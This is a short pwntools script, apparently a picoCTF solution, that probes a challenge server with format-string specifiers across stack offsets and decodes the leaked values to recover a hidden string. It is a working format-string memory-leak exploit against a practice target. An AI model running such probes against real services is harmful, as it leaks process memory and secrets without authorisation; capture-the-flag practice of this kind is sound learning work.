from pwn import context, remote

HOST = "mimas.picoctf.net"
PORT = 63271

context.log_level = "critical"
context.arch = "amd64"

start_offset = 1
max_offset = 20


for offset in range(start_offset, max_offset + 1):
    p = remote(HOST, PORT)
    p.recvuntil(b"back to you:")
    p.sendline(f"%{offset}$p".encode())

    p.recvline()
    response = p.recvline().decode()
    response = response.split(":")[1].strip()

    try:
        response = bytes.fromhex(response[2:]).decode()
        print(response)
    except Exception:
        print("err")

    p.close()
